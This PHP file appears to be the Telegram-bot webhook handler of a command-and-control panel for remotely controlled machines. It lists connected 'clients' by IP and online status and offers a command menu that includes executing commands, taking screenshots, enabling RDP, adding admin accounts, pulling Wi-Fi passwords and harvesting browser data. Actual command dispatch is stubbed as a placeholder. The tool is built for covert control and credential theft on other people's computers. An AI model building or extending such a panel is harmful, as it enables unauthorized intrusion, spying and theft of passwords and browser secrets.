<?php
namespace Handlers;

use Services\LoggerService;
use Services\TelegramService;
use Services\ClientService;
use PDO;

class WebhookHandler
{
    private $pdo;
    private $logger;
    private $telegram;
    private $clientService;

    public function __construct(PDO $pdo)
    {
        $this->pdo = $pdo;
        $this->logger = new LoggerService();
        $this->telegram = new TelegramService($this->logger);
        $this->clientService = new ClientService($pdo, $this->logger);
    }

    public function handle(array $update)
    {
        if (!$update) {
            http_response_code(400);
            $this->logger->logError("Invalid webhook request");
            die("Invalid request");
        }

        $this->logger->logWebhook(json_encode($update));

        if (isset($update['callback_query'])) {
            $callbackHandler = new CallbackQueryHandler($this->pdo, $this->logger, $this->telegram, $this->clientService);
            $callbackHandler->handle($update['callback_query']);
        } elseif (isset($update['message'])) {
            $this->processMessage($update['message']);
        }

        http_response_code(200);
    }

    private function processMessage(array $message)
    {
        $chatId = $message['chat']['id'] ?? null;
        $text = $message['text'] ?? '';
        $userId = $message['from']['id'] ?? null;

        if (!$this->clientService->isUserAuthorized($userId)) {
            $this->telegram->sendMessage($chatId, "Unauthorized access. Only the admin can issue commands.");
            $this->logger->logError("Unauthorized access attempt by user_id: $userId");
            return;
        }

        if (preg_match('/^\/select\s+(.+)$/', $text, $matches)) {
            $clientId = trim($matches[1]);
            if ($this->clientService->clientExists($clientId)) {
                $this->clientService->setSelectedClient($userId, $clientId);
                $this->sendCommandKeyboard($chatId, "Selected client: $clientId. Choose a command:");
                $this->logger->logWebhook("Client selected via /select: $clientId, user_id: $userId, chat_id: $chatId");
            } else {
                $this->telegram->sendMessage($chatId, "Client ID '$clientId' not found. Use /start to see available clients.");
                $this->logger->logError("Invalid client_id in /select: $clientId, user_id: $userId, chat_id: $chatId");
            }
            return;
        }

        if (preg_match('/^\/start$/', $text)) {
            $this->sendClientKeyboard($chatId);
        } else {
            $selectedClient = $this->clientService->getSelectedClient($userId);
            if ($selectedClient) {
                $response = $this->processCommand($text, $selectedClient);
                $this->telegram->sendMessage($chatId, "Command '$text' queued for client $selectedClient.");
            } else {
                $this->telegram->sendMessage($chatId, "No client selected. Use /start or /select <client_id>.");
            }
        }
    }

    private function processCommand(string $command, string $clientId): array
    {
        // Placeholder: Implement command processing logic from original api.php
        return ['status' => 'queued'];
    }

    private function sendClientKeyboard(string $chatId)
    {
        $clients = $this->getClientStatus();
        if (empty($clients)) {
            $this->telegram->sendMessage($chatId, "No clients registered. Please ensure clients are connected. Use /select <client_id> to select directly.");
            $this->logger->logError("No clients found for keyboard, chat_id: $chatId");
            return;
        }

        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($clients as $client) {
            $status = $client['is_online'] ? '🟢' : '🔴';
            $ip = $client['ip_address'] ?? 'Unknown';
            $row[] = [
                'text' => "$status {$client['client_id']} ($ip)",
                'callback_data' => "select_client:{$client['client_id']}"
            ];
            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->telegram->sendMessage($chatId, "Select a client:", ['reply_markup' => $keyboard]);
    }

    private function sendCommandKeyboard(string $chatId, string $message)
    {
        $commands = [
            '/status' => 'System Status',
            '/screenshot' => 'Take Screenshot',
            '/upload' => 'Upload File',
            '/exec' => 'Execute Command',
            '/logs' => 'View Logs',
            '/hosts' => 'View Hosts',
            '/screens' => 'List Screenshots',
            '/browse' => 'Browse Directory',
            '/get-info' => 'System Info',
            '/go' => 'Open URL',
            '/shutdown' => 'Shutdown',
            '/test_telegram' => 'Test Telegram',
            '/upload_file' => 'Upload File',
            '/upload_url' => 'Upload from URL',
            '/tasks' => 'List Tasks',
            '/startup' => 'Manage Startup',
            '/signout' => 'Sign Out',
            '/sleep' => 'Sleep',
            '/restart' => 'Restart',
            '/listusers' => 'List Users',
            '/addadmin' => 'Add Admin',
            '/end_task' => 'End Task',
            '/enable_rdp' => 'Enable RDP',
            '/disable_rdp' => 'Disable RDP',
            '/getwifipasswords' => 'Get Wi-Fi Passwords',
            '/get_browser_data' => 'Get Browser Data',
            '/select' => 'Select Client'
        ];

        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($commands as $cmd => $label) {
            $row[] = ['text' => $label, 'callback_data' => "command:$cmd"];
            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->telegram->sendMessage($chatId, $message, ['reply_markup' => $keyboard]);
    }

    private function getClientStatus(): array
    {
        try {
            $stmt = $this->pdo->query("SELECT client_id, ip_address, is_online FROM clients");
            return $stmt->fetchAll();
        } catch (\PDOException $e) {
            $this->logger->logError("Failed to fetch client status: " . $e->getMessage());
            return [];
        }
    }
}